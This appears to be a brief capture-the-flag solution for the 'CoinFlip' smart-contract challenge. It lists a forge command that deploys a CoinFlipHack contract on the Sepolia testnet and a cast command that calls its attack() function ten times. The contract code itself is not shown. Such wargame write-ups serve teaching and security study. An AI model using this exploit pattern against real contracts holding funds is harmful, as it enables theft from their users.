# CoinFlip Solution

1) Deploy `CoinFlipHack`:

```
forge create CoinFlipHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

2) Call `attack()` 10 times:

```
cast send `coinFlipHackAddress` "attack()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
